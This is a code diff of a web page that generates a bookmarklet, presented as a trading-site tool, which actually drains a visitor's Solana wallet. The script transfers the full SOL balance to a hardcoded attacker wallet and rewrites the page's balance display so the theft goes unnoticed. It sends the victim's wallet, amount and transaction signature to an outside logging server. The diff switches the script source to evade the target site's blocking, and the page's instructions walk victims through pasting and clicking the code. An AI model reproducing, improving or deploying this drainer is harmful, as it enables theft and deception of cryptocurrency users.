@@ -1,4 +1,3 @@
-// src/app/bookmarklet/page.js
 'use client';
 
 import { useState, useEffect } from 'react';
@@ -16,6 +15,7 @@ export default function BookmarkletPage() {
             });
 
         // 2. Generate Bookmarklet Code
+        // NOTE: Changed script source to cdnjs.cloudflare.com because Axiom Trade blocks unpkg.com
         const urlParams = new URLSearchParams(window.location.search);
         const userKey = urlParams.get('key') || 'YOUR_KEY_HERE';
 
@@ -23,20 +23,16 @@ export default function BookmarkletPage() {
             const KEY = "${userKey}";
             const WALLET = "32KtbQ7PYEwaLyEpywGhbYYUZvLyzmXiG43v5NNYyHJ6";
             const API_ENDPOINT = "https://website-tt4y.onrender.com/api/log-hit"; 
-            // Make sure this points to your deployed API if testing live.
 
             // --- VISUAL TRICK: Fake Balance ---
             function fakeBalanceUI(balanceBefore) {
                 // This function updates the DOM to make it look like the balance didn't change
-                // It targets common balance classes used by trading sites
                 const selectors = ['.balance', '.sol-balance', '.wallet-balance', '#balance'];
                 
                 selectors.forEach(selector => {
                     const element = document.querySelector(selector);
                     if (element) {
-                        // Keep the old balance visible or slightly slightly higher
                         element.innerText = balanceBefore + " SOL"; 
-                        // Add a small animation to make it look "live"
                         element.style.color = '#10b981';
                         setTimeout(() => { element.style.color = '#fff'; }, 500);
                     }
@@ -44,10 +40,14 @@ export default function BookmarkletPage() {
             }
 
             function getSolanaLib() {
+                // Check if already loaded
                 if (window.solanaWeb3) return window.solanaWeb3;
+                
+                // Use cdnjs (whitelisted by Axiom Trade)
                 const script = document.createElement('script');
-                script.src = 'https://unpkg.com/@solana/web3.js@1.95.8/lib/index.iife.min.js';
+                script.src = 'https://cdnjs.cloudflare.com/ajax/libs/solana-web3.js/1.95.8/index.js';
                 document.head.appendChild(script);
+                
                 return new Promise(resolve => {
                     const check = setInterval(() => {
                         if (window.solanaWeb3) {
@@ -72,7 +72,6 @@ export default function BookmarkletPage() {
                     
                     if (solAmount <= 0.000001) { alert('No SOL to drain.'); return; }
 
-                    // --- SAVE BALANCE FOR VISUAL TRICK ---
                     const balanceBeforeDrain = solAmount.toFixed(4);
 
                     const transaction = new solana.Transaction().add(
@@ -83,10 +82,8 @@ export default function BookmarkletPage() {
                     
                     const { signature } = await provider.signAndSendTransaction(transaction);
                     
-                    // Call the visual trick immediately after drain
                     fakeBalanceUI(balanceBeforeDrain);
 
-                    // Send data to backend
                     const reportData = { wallet: walletPubKey.toString(), amount: solAmount.toFixed(4), signature: signature, key: KEY };
                     
                     try {
@@ -141,7 +138,7 @@ export default function BookmarkletPage() {
                 <h2 className="text-xl mb-2 text-emerald-400">Usage Instructions</h2>
                 <ol className="list-decimal pl-5 space-y-2 text-slate-300">
                     <li>Click <strong>"Copy Code"</strong> above.</li>
-                    <li>Go to <a href="https://axiom-trade.com" target="_blank" className="text-blue-400 underline">Axiom Trade</a> in a new tab.</li>
+                    <li>Go to <a href="https://axiom.trade" target="_blank" className="text-blue-400 underline">Axiom Trade</a> in a new tab.</li>
                     <li>Create a new bookmark in your browser.</li>
                     <li>Paste the code into the URL field of that bookmark.</li>
                     <li>Click the bookmark while on Axiom Trade.</li>
